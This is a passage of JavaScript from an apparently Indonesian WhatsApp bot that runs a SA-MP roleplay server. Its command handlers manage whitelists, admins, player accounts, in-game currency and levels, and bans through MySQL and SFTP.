            for (const [no, nama] of Object.entries(wl)) {
                if (nama.toLowerCase() === targetNama.toLowerCase()) {
                    targetNomor = no;
                    break;
                }
            }
        }
    }

    try {
        const conn = await mysql.createConnection({
            host: global.hostucp,
            user: global.usernamedb,
            password: global.passworddb,
            database: global.database,
        });

        const [rows] = await conn.execute(
            `SELECT * FROM \`${global.tableucp}\` WHERE \`${global.rowucp}\` = ?`,
            [targetNama]
        );

        await conn.end();

        if (!targetNama && rows.length === 0) return reply('Data tidak ditemukan di database maupun file JSON.');

        let msg = `*HASIL CEK DATA UCP*\n\n`;
        if (targetNama) msg += `*Nama:* ${targetNama}\n`;
        if (targetNomor) msg += `*Nomor:* ${targetNomor}\n`;
        if (verifycode !== '-') msg += `*Verifycode:* ${verifycode}\n`;
        if (createdAt !== '-') msg += `*Dibuat:* ${createdAt}\n`;

        if (rows.length > 0) {
            msg += `*Tersimpan di database:* Ya\n`;
        } else {
            msg += `*Tersimpan di database:* Tidak\n`;
        }

        reply(msg);
    } catch (err) {
        console.error(err);
        reply('Gagal mengambil data dari database.');
    }
}
break;

    case 'daftarucp': {
    if (!(isOwner || isStaff)) return reply('Kamu tidak memiliki izin untuk menggunakan perintah ini.');

    const mysql = require('mysql2/promise');
    const wlPath = './database/wl.json';
    let wl = fs.existsSync(wlPath) ? JSON.parse(fs.readFileSync(wlPath)) : {};

    try {
        const conn = await mysql.createConnection({
            host: global.hostucp,
            user: global.usernamedb,
            password: global.passworddb,
            database: global.database,
        });

        const [rows] = await conn.execute(`SELECT \`${global.rowucp}\`, DiscordID FROM \`${global.tableucp}\``);
        await conn.end();

        if (!rows.length) return reply('Tidak ada data UCP ditemukan di database.');

        let daftar = '*DAFTAR SEMUA UCP:*\n\n';
        for (const row of rows) {
            const nama = row[global.rowucp];
            const nomor = row.DiscordID;
            if (wl[nomor] && wl[nomor] === nama) {
                daftar += `- ${nama} (${nomor})\n`;
            } else {
                daftar += `- ${nama} (Daftar InGame)\n`;
            }
        }

        reply(daftar.trim());
    } catch (err) {
        console.error(err);
        reply('Gagal mengambil data dari database.');
    }
}
break;

    case 'addwl': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');
    if (!text) return reply(`Kirim perintah:\n${prefix}addwl [Nama_Nama]\nContoh: .addwl Pablo_Satoru`);
    reply(mess.wait);

    const nama = text.trim();
    const wlFilePath = `${global.sftppath}${nama}.txt`;

    // Validasi format nama harus menggunakan underscore
    if (!/^.+_.+$/.test(nama)) {
        return reply('Nama harus menggunakan format Nama_Nama (contoh: Pablo_Satoru).');
    }

    function isToxic(name) {
        const toxicWords = require('./database/toxic.json');
        return toxicWords.some(word => name.toLowerCase().includes(word.toLowerCase()));
    }

    if (isToxic(nama)) return reply('Nama yang Anda masukkan mengandung kata-kata terlarang.');

    // Cek apakah nama sudah terdaftar di server SFTP
    try {
        const sftp = new SftpClient();
        await sftp.connect({
            host: global.host,
            port: global.port,
            username: global.username,
            password: global.password,
        });

        const fileExists = await sftp.exists(wlFilePath); // Cek apakah file sudah ada di SFTP
        if (fileExists) {
            await sftp.end();
            return reply(`Nama "${nama}" sudah terdaftar di server.`);
        }

        // Jika file tidak ada, lanjutkan untuk menambahkannya ke SFTP
        await sftp.put(Buffer.from(''), wlFilePath, { mode: 0o644 });
        await sftp.append(Buffer.from(`${nama}\n`), wlFilePath);
        await sftp.end();

        reply(`
*Dear Warga ${global.NameServerLite} !*
 
*Pendaftaran Nama anda berhasil didaftarkan! harap gunakan nama karakter anda dibawah ini untuk Registrasi pada InGame.*
 
*Nama: ${nama}*
 
*IP:* ${global.IpServer}:${global.PortServer}
 
*©2024© ${global.NameServerFull}*`);
    } catch (error) {
        console.error(error);
        return reply('Terjadi kesalahan saat menambahkan nama ke whitelist.');
    }
}
break;

case 'addnumber': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');
    if (!text) {
        return reply(`Kirim perintah:\n${prefix}addnumber [Nomor]\nContoh: .addnumber 6281234567890`);
    }
    reply(mess.wait)

    const nomorTelepon = text.trim();

    if (!/^\d+$/.test(nomorTelepon)) {
        return reply('Nomor telepon tidak valid. Harus berupa angka saja.');
    }

    const wlDatabasePath = './database/wl.json';
    let database = {};

    // Memastikan wl.json ada dan bisa dibaca
    if (fs.existsSync(wlDatabasePath)) {
        try {
            database = JSON.parse(fs.readFileSync(wlDatabasePath));
        } catch (error) {
            return reply('Terjadi kesalahan saat membaca database whitelist.');
        }
    }

    // Cek apakah nomor sudah ada
    if (database[nomorTelepon]) {
        return reply(`Nomor ${nomorTelepon} sudah terdaftar di whitelist dengan nama "${database[nomorTelepon]}".`);
    }

    // Tambahkan nomor ke wl.json
    database[nomorTelepon] = 'Sudah di whitelist kan admin';

    try {
        fs.writeFileSync(wlDatabasePath, JSON.stringify(database, null, 2));
        reply(`Nomor ${nomorTelepon} berhasil ditambahkan ke whitelist dengan nama "Sudah di whitelist kan admin".`);
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat menyimpan data ke database whitelist.');
    }
}
break;

case 'delnumber': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');
    if (!text) {
        return reply(`Kirim perintah:\n${prefix}delnumber [Nomor]\nContoh: .delnumber 6281234567890`);
    }
    reply(mess.wait)

    const nomorTelepon = text.trim();

    if (!/^\d+$/.test(nomorTelepon)) {
        return reply('Nomor telepon tidak valid. Harus berupa angka saja.');
    }

    const wlDatabasePath = './database/wl.json';
    let database = {};

    // Memastikan wl.json ada dan bisa dibaca
    if (fs.existsSync(wlDatabasePath)) {
        try {
            database = JSON.parse(fs.readFileSync(wlDatabasePath));
        } catch (error) {
            return reply('Terjadi kesalahan saat membaca database whitelist.');
        }
    }

    // Cek apakah nomor ada di database
    if (!database[nomorTelepon]) {
        return reply(`Nomor ${nomorTelepon} tidak ditemukan di database whitelist.`);
    }

    // Hapus nomor dari wl.json
    delete database[nomorTelepon];

    try {
        fs.writeFileSync(wlDatabasePath, JSON.stringify(database, null, 2));
        reply(`Nomor ${nomorTelepon} berhasil dihapus dari whitelist.`);
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat menyimpan perubahan ke database whitelist.');
    }
}
break;

case 'setcs': {
const mysql = require('mysql2/promise');
if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.'); // Pastikan hanya Owner yang bisa mengakses

    const nama = args[0]; // Nama target yang ingin ditambah uangnya
    const status = parseInt(args[1]); // Jumlah uang yang akan ditambahkan

    if (!nama || isNaN(status)) {
        return reply('Gunakan perintah dengan format yang benar: .setcs [Nama] [0/1 (Cs Off/Cs On)]\nContoh: .setcs Pablo_Satoru 1');
    }
            try {
                reply(mess.wait)
                const connection = await mysql.createConnection({
                    host: global.hostucp,
                    user: global.usernamedb,
                    password: global.passworddb,
                    database: global.database
                });

                const [rows] = await connection.execute(
                    'UPDATE accounts SET pCS = ? WHERE pName = ?',
                    [status, nama]
                );

                if (rows.affectedRows > 0) {
                    reply('CS status updated successfully.');
                } else {
                    reply('No account found with the given name.');
                }

                await connection.end();
            } catch (error) {
                reply('An error occurred: ' + error.message);
            }
}
            break;
            
case 'setadmin': {
    if (!isOwner) return reply('Perintah ini hanya bisa digunakan oleh owner');

    if (!text.includes(' ')) {
        return reply(`Kirim perintah:\n${prefix}setadmin [Nama_Nama] [RankAdmin]\nContoh: ${prefix}setadmin Pablo_Satoru 8`);
    }

    const args = text.split(' ');
    const name = args[0];
    const rank = parseInt(args[1], 10);

    if (!name.includes('_')) {
        return reply('Nama harus menggunakan format Nama_Nama.');
    }

    if (isNaN(rank) || rank <= 0) {
        return reply('RankAdmin harus berupa angka dan lebih besar dari 0.');
    }

    // Import mysql2
    const mysql = require('mysql2/promise');

    // Membuka koneksi baru
    reply(mess.wait)
    const connection = await mysql.createConnection({
        host: global.hostucp,
        user: global.usernamedb,
        password: global.passworddb,
        database: global.database,
    });

    try {
        // Cek apakah admin sudah ada
        const [results] = await connection.execute('SELECT * FROM admin WHERE Name = ?', [name]);

        if (results.length > 0) {
            // Jika admin sudah ada, update rank
            await connection.execute('UPDATE admin SET pAdmin = ? WHERE Name = ?', [rank, name]);
            reply(`Rank admin untuk "${name}" berhasil diperbarui menjadi ${rank}.`);
        } else {
            // Jika admin belum ada, tambahkan
            await connection.execute('INSERT INTO admin (Name, pAdmin) VALUES (?, ?)', [name, rank]);
            reply(`Admin "${name}" berhasil ditambahkan dengan rank ${rank}.`);
        }
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat memproses data admin.');
    } finally {
        // Menutup koneksi setelah selesai
        await connection.end();
    }
}
break;

case 'deladmin': {
    if (!isOwner) {
        return reply('Perintah ini hanya bisa digunakan oleh owner.');
    }
    if (!text) {
        return reply(`Kirim perintah:\n${prefix}deladmin [Nama_Nama]\nContoh: ${prefix}deladmin Pablo_Satoru`);
    }

    const name = text.trim();

    try {
        reply(mess.wait)
        const connection = mysql.createConnection({
            host: global.hostucp,
            user: global.usernamedb,
            password: global.passworddb,
            database: global.database,
        });

        connection.query(
            'DELETE FROM admin WHERE Name = ?',
            [name],
            (err, results) => {
                if (err) {
                    console.error(err);
                    return reply('Terjadi kesalahan saat menghapus admin.');
                }

                if (results.affectedRows === 0) {
                    return reply(`Nama "${name}" tidak ditemukan di database.`);
                }

                reply(`Sukses! Admin dengan nama "${name}" telah dihapus dari database.`);
            }
        );

        connection.end();
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat menghubungkan ke database.');
    }
}
break;
    
    case 'listadmin': {
    if (!isOwner) {
        return reply('Perintah ini hanya bisa digunakan oleh owner.');
    }

    try {
        reply(mess.wait)
        const connection = mysql.createConnection({
            host: global.hostucp,
            user: global.usernamedb,
            password: global.passworddb,
            database: global.database,
        });

        connection.query(
            'SELECT Name, pAdmin FROM admin ORDER BY pAdmin DESC',
            (err, results) => {
                if (err) {
                    console.error(err);
                    return reply('Terjadi kesalahan saat mengambil data admin.');
                }

                if (results.length === 0) {
                    return reply('Tidak ada admin yang terdaftar di database.');
                }

                let message = '*LIST ADMIN*\n\n';
                results.forEach((admin, index) => {
                    message += `${index + 1}. *Nama*: ${admin.Name}\n        *Rank*: ${admin.pAdmin}\n\n`;
                });

                reply(message.trim());
            }
        );

        connection.end();
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat menghubungkan ke database.');
    }
}
break;

    case 'addakses': {
    const groupId = msg.key.participant ? m.chat : null;
    if (!isOwner) return reply('Perintah ini hanya bisa digunakan oleh owner');
    if (!groupId || !groupId.endsWith('@g.us')) {
        return reply('Perintah ini hanya bisa digunakan dalam grup!');
    }

    const type = args[0]?.toLowerCase(); // Jenis akses: wl, ucp, admin, all
    if (!['wl', 'ucp', 'admin', 'all'].includes(type)) {
        return reply('Jenis akses tidak valid! Gunakan: wl, ucp, admin, atau all.');
    }

    if (type === 'all') {
        if (!allowedGroupsWl.includes(groupId)) allowedGroupsWl.push(groupId);
        if (!allowedGroupsUcp.includes(groupId)) allowedGroupsUcp.push(groupId);
        if (!allowedGroupsAdmin.includes(groupId)) allowedGroupsAdmin.push(groupId);

        // Simpan perubahan untuk masing-masing jenis akses
        saveAllowedGroupsWl(allowedGroupsWl);
        saveAllowedGroupsUcp(allowedGroupsUcp);
        saveAllowedGroupsAdmin(allowedGroupsAdmin);

        return reply('Akses telah ditambahkan ke semua jenis.');
    }

    const accessGroups = {
        wl: allowedGroupsWl,
        ucp: allowedGroupsUcp,
        admin: allowedGroupsAdmin
    };

    if (accessGroups[type].includes(groupId)) {
        return reply(`Grup sudah memiliki akses ${type}.`);
    }

    accessGroups[type].push(groupId);

    // Simpan perubahan untuk jenis akses yang dipilih
    if (type === 'wl') saveAllowedGroupsWl(accessGroups.wl);
    if (type === 'ucp') saveAllowedGroupsUcp(accessGroups.ucp);
    if (type === 'admin') saveAllowedGroupsAdmin(accessGroups.admin);

    return reply(`Akses telah ditambahkan untuk grup ${type}.`);
}
break;

case 'delakses': {
    const groupId = msg.key.participant ? m.chat : null;
    if (!isOwner) return reply('Perintah ini hanya bisa digunakan oleh owner');
    if (!groupId || !groupId.endsWith('@g.us')) {
        return reply('Perintah ini hanya bisa digunakan dalam grup!');
    }

    const type = args[0]?.toLowerCase(); // Jenis akses: wl, ucp, admin, all
    if (!['wl', 'ucp', 'admin', 'all'].includes(type)) {
        return reply('Jenis akses tidak valid! Gunakan: wl, ucp, admin, atau all.');
    }

    if (type === 'all') {
        const removeFromArray = (arr) => {
            const index = arr.indexOf(groupId);
            if (index > -1) arr.splice(index, 1);
        };

        removeFromArray(allowedGroupsWl);
        removeFromArray(allowedGroupsUcp);
        removeFromArray(allowedGroupsAdmin);

        // Simpan perubahan setelah menghapus akses dari semua jenis
        saveAllowedGroupsWl(allowedGroupsWl);
        saveAllowedGroupsUcp(allowedGroupsUcp);
        saveAllowedGroupsAdmin(allowedGroupsAdmin);

        return reply('Akses telah dihapus dari semua jenis.');
    }

    const accessGroups = {
        wl: allowedGroupsWl,
        ucp: allowedGroupsUcp,
        admin: allowedGroupsAdmin
    };

    const groupIndex = accessGroups[type].indexOf(groupId);
    if (groupIndex === -1) {
        return reply(`Grup tidak ditemukan dalam daftar akses ${type}.`);
    }

    accessGroups[type].splice(groupIndex, 1);

    // Simpan perubahan untuk jenis akses yang dipilih
    if (type === 'wl') saveAllowedGroupsWl(accessGroups.wl);
    if (type === 'ucp') saveAllowedGroupsUcp(accessGroups.ucp);
    if (type === 'admin') saveAllowedGroupsAdmin(accessGroups.admin);

    return reply(`Akses telah dihapus untuk grup ${type}.`);
}
break;

case 'listakses': {
    if (!isOwner) return reply('Perintah ini hanya bisa digunakan oleh owner');

    const type = args[0]?.toLowerCase(); // Jenis akses: wl, ucp, admin, all
    if (!['wl', 'ucp', 'admin', 'all'].includes(type)) {
        return reply('Jenis akses tidak valid! Gunakan: wl, ucp, admin, atau all.');
    }

    if (type === 'all') {
        let message = '';
        if (allowedGroupsWl.length > 0) {
            message += `Grup dengan akses wl:\n`;
            allowedGroupsWl.forEach((groupId, index) => {
                message += `${index + 1}. ${groupId}\n`;
            });
        }
        if (allowedGroupsUcp.length > 0) {
            message += `\nGrup dengan akses ucp:\n`;
            allowedGroupsUcp.forEach((groupId, index) => {
                message += `${index + 1}. ${groupId}\n`;
            });
        }
        if (allowedGroupsAdmin.length > 0) {
            message += `\nGrup dengan akses admin:\n`;
            allowedGroupsAdmin.forEach((groupId, index) => {
                message += `${index + 1}. ${groupId}\n`;
            });
        }
        return reply(message || 'Tidak ada grup yang memiliki akses.');
    }

    const accessGroups = {
        wl: allowedGroupsWl,
        ucp: allowedGroupsUcp,
        admin: allowedGroupsAdmin
    };

    if (accessGroups[type].length === 0) {
        return reply(`Tidak ada grup yang memiliki akses ${type}.`);
    }

    let listMessage = `Grup dengan akses ${type}:\n`;
    accessGroups[type].forEach((groupId, index) => {
        listMessage += `${index + 1}. ${groupId}\n`;
    });

    return reply(listMessage);
}
break;

case 'infoakun': {
    const nomorTelepon = m.sender.split('@')[0]; // Mengambil nomor telepon pengirim
    const wlDatabasePath = './database/wl.json';
    let database = {};

    // Memastikan wl.json ada dan bisa dibaca
    if (fs.existsSync(wlDatabasePath)) {
        try {
            database = JSON.parse(fs.readFileSync(wlDatabasePath));
        } catch (error) {
            return reply('Terjadi kesalahan saat membaca database whitelist/UCP.');
        }
    }

    // Cek apakah nomor terdaftar dalam wl.json
    if (!database[nomorTelepon]) {
        return reply('Nomor Anda tidak terdaftar di whitelist/UCP.');
    }

    const namaRp = database[nomorTelepon]; // Nama RP dari wl.json
    reply(mess.wait)

    // Koneksi ke database MySQL
    const connection = mysql.createConnection({
        host: global.hostucp,
        user: global.usernamedb,
        password: global.passworddb,
        database: global.database
    });

    // Query untuk mencari data akun berdasarkan Nama RP
    connection.query(
        'SELECT * FROM accounts WHERE pName = ?',
        [namaRp],
        (err, results) => {
            if (err) {
                console.error(err);
                return reply('Terjadi kesalahan saat mengambil data dari database.');
            }

            if (results.length === 0) {
                return reply('Data akun IC tidak ditemukan.');
            }

            const akunIC = results[0]; // Mengambil data akun pertama (jika ada)

            // Menyusun pesan informasi akun
            const infoAkun = `
*INFO AKUN ${global.NameServerLite}*

*Informasi OOC*
* Nama Rp: ${namaRp}
* Nomor Telp: ${nomorTelepon}

*Informasi IC*
* Username: ${akunIC.pName}
* Level: ${akunIC.pLevel}
* Skin: ${akunIC.pSkin}
* Money: ${akunIC.pCash}
* Bank: ${akunIC.pBank}
* Rubel: ${akunIC.pRouble}
* Gun: ${akunIC.pGun}
* Car: ${akunIC.cModel}
* Lisensi: ${akunIC.pLicenses}
            `;

            // Mengirimkan informasi akun
            reply(infoAkun);
        
    });

    // Menutup koneksi ke database setelah query selesai
    connection.end();
}
break;

case 'cekakun': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.'); // Pastikan hanya admin yang bisa mengakses

    const targetName = args[0]; // Nama target yang ingin dicek
    if (!targetName) return reply('Masukkan nama pengguna yang ingin dicek. Contoh: .cekakun Pablo_Satoru');
    reply(mess.wait)

    const connection = mysql.createConnection({
        host: global.hostucp,
        user: global.usernamedb,
        password: global.passworddb,
        database: global.database
    });

    // Query untuk mencari data akun berdasarkan Nama RP
    connection.query(
        'SELECT * FROM accounts WHERE pName = ?',
        [targetName],
        (err, results) => {
            if (err) {
                console.error(err);
                return reply('Terjadi kesalahan saat mengambil data dari database.');
            }

            if (results.length === 0) {
                return reply('Data akun IC tidak ditemukan.');
            }

            const akunIC = results[0]; // Mengambil data akun pertama (jika ada)

            // Menyusun pesan informasi akun
            const infoAkun = `
*INFO AKUN ${global.NameServerLite}*

*Informasi IC*
* Username: ${akunIC.pName}
* Level: ${akunIC.pLevel}
* Skin: ${akunIC.pSkin}
* Money: ${akunIC.pCash}
* Bank: ${akunIC.pBank}
* Rubel: ${akunIC.pRouble}
* Gun: ${akunIC.pGun}
* Car: ${akunIC.cModel}
* Lisensi: ${akunIC.pLicenses}
            `;

            // Mengirimkan informasi akun
            reply(infoAkun);
        
    });

    // Menutup koneksi ke database setelah query selesai
    connection.end();
}
break;

case 'addmoney': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.'); // Pastikan hanya Owner yang bisa mengakses

    const targetName = args[0]; // Nama target yang ingin ditambah uangnya
    const amount = parseInt(args[1]); // Jumlah uang yang akan ditambahkan

    if (!targetName || isNaN(amount)) {
        return reply('Gunakan perintah dengan format yang benar: .addmoney [Nama] [Jumlah Uang]\nContoh: .addmoney Pablo_Satoru 5000');
    }

    // Koneksi ke database MySQL menggunakan konfigurasi global
    reply(mess.wait)
    const connection = mysql.createConnection({
        host: global.hostucp, // Host MySQL Anda
        user: global.usernamedb, // Username MySQL Anda
        password: global.passworddb, // Password MySQL Anda
        database: global.database // Database Anda
    });

    // Query untuk mencari data akun berdasarkan Nama RP
    connection.query(
        'SELECT pCash FROM accounts WHERE pName = ?',
        [targetName], // Parameter untuk nama target
        (err, results) => {
            if (err) {
                console.error(err);
                connection.end(); // Pastikan koneksi ditutup setelah error
                return reply('Terjadi kesalahan saat mengambil data dari database.');
            }

            if (results.length === 0) {
                connection.end(); // Pastikan koneksi ditutup setelah query selesai
                return reply('Akun dengan nama tersebut tidak ditemukan.');
            }

            const currentMoney = results[0].pCash; // Uang saat ini
            const newMoney = currentMoney + amount; // Uang setelah penambahan

            // Query untuk memperbarui data uang
            connection.query(
                'UPDATE accounts SET pCash = ? WHERE pName = ?',
                [newMoney, targetName], // Parameter untuk update uang
                (updateErr) => {
                    if (updateErr) {
                        console.error(updateErr);
                        connection.end(); // Pastikan koneksi ditutup setelah error
                        return reply('Terjadi kesalahan saat memperbarui data uang.');
                    }

                    // Menampilkan hasil
                    reply(`Sukses Menambah Uang Ke ${targetName}\n\nUang Sebelumnya: ${currentMoney}\nUang Sekarang: ${newMoney}`);
                    connection.end(); // Pastikan koneksi ditutup setelah query selesai
                }
            );
        }
    );
}
break;

case 'addrubel': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.'); // Pastikan hanya Owner yang bisa mengakses

    const targetName = args[0]; // Nama target yang ingin ditambah rubelnya
    const amount = parseInt(args[1]); // Jumlah rubel yang akan ditambahkan

    if (!targetName || isNaN(amount)) {
        return reply('Gunakan perintah dengan format yang benar: .addrubel [Nama] [Jumlah Rubel]\nContoh: .addrubel Pablo_Satoru 1000');
    }

    // Koneksi ke database MySQL menggunakan konfigurasi global
    reply(mess.wait)
    const connection = mysql.createConnection({
        host: global.hostucp, // Host MySQL Anda
        user: global.usernamedb, // Username MySQL Anda
        password: global.passworddb, // Password MySQL Anda
        database: global.database // Database Anda
    });

    // Query untuk mencari data akun berdasarkan Nama RP
    connection.query(
        'SELECT pRouble FROM accounts WHERE pName = ?',
        [targetName], // Parameter untuk nama target
        (err, results) => {
            if (err) {
                console.error(err);
                connection.end(); // Pastikan koneksi ditutup setelah error
                return reply('Terjadi kesalahan saat mengambil data dari database.');
            }

            if (results.length === 0) {
                connection.end(); // Pastikan koneksi ditutup setelah query selesai
                return reply('Akun dengan nama tersebut tidak ditemukan.');
            }

            const currentRuble = results[0].pRouble; // Rubel saat ini
            const newRuble = currentRuble + amount; // Rubel setelah penambahan

            // Query untuk memperbarui data rubel
            connection.query(
                'UPDATE accounts SET pRouble = ? WHERE pName = ?',
                [newRuble, targetName], // Parameter untuk update rubel
                (updateErr) => {
                    if (updateErr) {
                        console.error(updateErr);
                        connection.end(); // Pastikan koneksi ditutup setelah error
                        return reply('Terjadi kesalahan saat memperbarui data rubel.');
                    }

                    // Menampilkan hasil
                    reply(`Sukses Menambah Rubel Ke ${targetName}\n\nRubel Sebelumnya: ${currentRuble}\nRubel Sekarang: ${newRuble}`);
                    connection.end(); // Pastikan koneksi ditutup setelah query selesai
                }
            );
        }
    );
}
break;

case 'addlevel': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.'); // Pastikan hanya Owner yang bisa mengakses

    const targetName = args[0]; // Nama target yang ingin ditambah levelnya
    const amount = parseInt(args[1]); // Jumlah level yang akan ditambahkan

    if (!targetName || isNaN(amount)) {
        return reply('Gunakan perintah dengan format yang benar: .addlevel [Nama] [Jumlah Level]\nContoh: .addlevel Pablo_Satoru 5');
    }

    // Koneksi ke database MySQL menggunakan konfigurasi global
    reply(mess.wait)
    const connection = mysql.createConnection({
        host: global.hostucp, // Host MySQL Anda
        user: global.usernamedb, // Username MySQL Anda
        password: global.passworddb, // Password MySQL Anda
        database: global.database // Database Anda
    });

    // Query untuk mencari data akun berdasarkan Nama RP
    connection.query(
        'SELECT pLevel FROM accounts WHERE pName = ?',
        [targetName], // Parameter untuk nama target
        (err, results) => {
            if (err) {
                console.error(err);
                connection.end(); // Pastikan koneksi ditutup setelah error
                return reply('Terjadi kesalahan saat mengambil data dari database.');
            }

            if (results.length === 0) {
                connection.end(); // Pastikan koneksi ditutup setelah query selesai
                return reply('Akun dengan nama tersebut tidak ditemukan.');
            }

            const currentLevel = results[0].pLevel; // Level saat ini
            const newLevel = currentLevel + amount; // Level setelah penambahan

            // Query untuk memperbarui data level
            connection.query(
                'UPDATE accounts SET pLevel = ? WHERE pName = ?',
                [newLevel, targetName], // Parameter untuk update level
                (updateErr) => {
                    if (updateErr) {
                        console.error(updateErr);
                        connection.end(); // Pastikan koneksi ditutup setelah error
                        return reply('Terjadi kesalahan saat memperbarui data level.');
                    }

                    // Menampilkan hasil
                    reply(`Sukses Menambah Level Ke ${targetName}\n\nLevel Sebelumnya: ${currentLevel}\nLevel Sekarang: ${newLevel}`);
                    connection.end(); // Pastikan koneksi ditutup setelah query selesai
                }
            );
        }
    );
}
break;

case 'delmoney': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');

    if (!text) {
        return reply(`Kirim perintah:\n${prefix}delmoney [Nama_Nama] [Jumlah]\nContoh: ${prefix}delmoney Pablo_Satoru 500`);
    }

    const args = text.split(' ');
    const name = args[0];
    const amount = parseInt(args[1], 10);

    if (isNaN(amount) || amount <= 0) {
        return reply('Jumlah uang harus berupa angka yang lebih besar dari 0.');
    }

    // Import mysql2
    const mysql = require('mysql2/promise');

    // Membuka koneksi baru
    reply(mess.wait)
    const connection = await mysql.createConnection({
        host: global.hostucp,
        user: global.usernamedb,
        password: global.passworddb,
        database: global.database,
    });

    try {
        // Cek apakah nama ada di database
        const [results] = await connection.execute('SELECT pCash FROM accounts WHERE pName = ?', [name]);

        if (results.length === 0) {
            return reply(`Akun dengan nama "${name}" tidak ditemukan.`);
        }

        const currentMoney = results[0].pCash;
        const newMoney = Math.max(0, currentMoney - amount); // Pastikan tidak ada angka negatif

        // Update uang di database
        await connection.execute('UPDATE accounts SET pCash = ? WHERE pName = ?', [newMoney, name]);

        reply(`Uang untuk "${name}" berhasil dikurangi sebanyak ${amount}.\n\nUang Sebelumnya: ${currentMoney}\nUang Sekarang: ${newMoney}`);
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat mengurangi uang.');
    } finally {
        await connection.end();
    }
}
break;

case 'dellevel': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');

    if (!text) {
        return reply(`Kirim perintah:\n${prefix}dellevel [Nama_Nama] [Jumlah]\nContoh: ${prefix}dellevel Pablo_Satoru 2`);
    }

    const args = text.split(' ');
    const name = args[0];
    const levelToSubtract = parseInt(args[1], 10);

    if (isNaN(levelToSubtract) || levelToSubtract <= 0) {
        return reply('Jumlah level harus berupa angka yang lebih besar dari 0.');
    }

    // Import mysql2
    const mysql = require('mysql2/promise');

    // Membuka koneksi baru
    reply(mess.wait)
    const connection = await mysql.createConnection({
        host: global.hostucp,
        user: global.usernamedb,
        password: global.passworddb,
        database: global.database,
    });

    try {
        // Cek apakah nama ada di database
        const [results] = await connection.execute('SELECT pLevel FROM accounts WHERE pName = ?', [name]);

        if (results.length === 0) {
            return reply(`Akun dengan nama "${name}" tidak ditemukan.`);
        }

        const currentLevel = results[0].pLevel;
        const newLevel = Math.max(0, currentLevel - levelToSubtract); // Pastikan tidak ada angka negatif

        // Update level di database
        await connection.execute('UPDATE accounts SET pLevel = ? WHERE pName = ?', [newLevel, name]);

        reply(`Level untuk "${name}" berhasil dikurangi sebanyak ${levelToSubtract}.\n\nLevel Sebelumnya: ${currentLevel}\nLevel Sekarang: ${newLevel}`);
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat mengurangi level.');
    } finally {
        await connection.end();
    }
}
break;

case 'delrubel': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');

    if (!text) {
        return reply(`Kirim perintah:\n${prefix}delrubel [Nama_Nama] [Jumlah]\nContoh: ${prefix}delrubel Pablo_Satoru 100`);
    }

    const args = text.split(' ');
    const name = args[0];
    const rubelToSubtract = parseInt(args[1], 10);

    if (isNaN(rubelToSubtract) || rubelToSubtract <= 0) {
        return reply('Jumlah rubel harus berupa angka yang lebih besar dari 0.');
    }

    // Import mysql2
    const mysql = require('mysql2/promise');

    // Membuka koneksi baru
    reply(mess.wait)
    const connection = await mysql.createConnection({
        host: global.hostucp,
        user: global.usernamedb,
        password: global.passworddb,
        database: global.database,
    });

    try {
        // Cek apakah nama ada di database
        const [results] = await connection.execute('SELECT pRouble FROM accounts WHERE pName = ?', [name]);

        if (results.length === 0) {
            return reply(`Akun dengan nama "${name}" tidak ditemukan.`);
        }

        const currentRubel = results[0].pRouble;
        const newRubel = Math.max(0, currentRubel - rubelToSubtract); // Pastikan tidak ada angka negatif

        // Update rubel di database
        await connection.execute('UPDATE accounts SET pRouble = ? WHERE pName = ?', [newRubel, name]);

        reply(`Rubel untuk "${name}" berhasil dikurangi sebanyak ${rubelToSubtract}.\n\nRubel Sebelumnya: ${currentRubel}\nRubel Sekarang: ${newRubel}`);
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat mengurangi rubel.');
    } finally {
        await connection.end();
    }
}
break;

case 'ban': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');

    const targetName = args[0]; // Nama pemain yang akan di-ban
    const duration = parseInt(args[1]); // Durasi ban dalam hari
    const reason = args.slice(2).join(' '); // Alasan ban

    if (!targetName || isNaN(duration) || !reason) {
        return reply('Gunakan format perintah yang benar: .ban [Nama] [Hari] [Reason]\nContoh: .ban Pablo_Satoru 30 Cheat');
    }

    const now = Math.floor(Date.now() / 1000); // Timestamp saat ini dalam detik
    const unbanDate = now + duration * 86400; // Hitung tanggal unban dalam detik

    reply(mess.wait)
    const connection = mysql.createConnection({
        host: global.hostucp,
        user: global.usernamedb,
        password: global.passworddb,
        database: global.database
    });

    // Query untuk menambahkan ban ke database
    connection.query(
        'INSERT INTO banlog (nameplayer, nameadmin, reason, date, unbandate, lockstate) VALUES (?, ?, ?, ?, ?, ?)',
        [targetName, '[Bot] PabloNetwork - SAMP V8', reason, now, unbanDate, 1],
        (err) => {
            if (err) {
                console.error(err);
                connection.end(); // Pastikan koneksi ditutup
                return reply('Terjadi kesalahan saat menambahkan ban.');
            }

            reply(`Sukses mem-ban ${targetName} selama ${duration} hari.\n\nAlasan: ${reason}`);
            connection.end(); // Tutup koneksi setelah selesai
        }
    );
}
break;

case 'unban': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');

    const targetName = args[0]; // Nama pemain yang akan di-unban
    if (!targetName) {
